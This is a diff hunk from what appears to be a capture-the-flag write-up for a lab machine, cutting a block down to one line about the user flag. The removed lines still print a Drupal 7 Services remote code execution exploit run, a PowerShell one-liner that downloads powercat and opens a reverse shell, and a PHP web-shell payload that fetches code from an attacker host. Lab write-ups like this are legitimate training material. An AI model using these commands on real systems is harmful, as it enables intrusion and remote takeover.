@@ -260,33 +260,7 @@ $file = [
 ];
 ```
 
-shows the flag
-
-```
-$ php 41564.php && curl http://10.129.177.169/test.php
-# Exploit Title: Drupal 7.x Services Module Remote Code Execution
-# Vendor Homepage: https://www.drupal.org/project/services
-# Exploit Author: Charles FOL
-# Contact: https://twitter.com/ambionics
-# Website: https://www.ambionics.io/blog/drupal-services-module-rce
-
-
-#!/usr/bin/php
-Stored session information in session.json
-Stored user information in user.json
-Cache contains 7 entries
-File written: http://10.129.177.169/test.php
-ba22fde1932d06eb...
-
-owershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.3:4444/powercat.ps1');powercat -c 10.10.14.3 -p 6666 -e cmd"
-
-$file = [
-    'filename' => 'test.php',
-    'data' => '<?php $output = shell_exec(\'PowerShell -Command "Invoke-WebRequest -Uri 10.10.14.23:4444\/powercat.ps1 -Outfile powercat.ps1"\'); echo "$output";
- ?>'
-];
-
-```
+shows the user flag.
 
 ### Reverse shells for initial access 
 
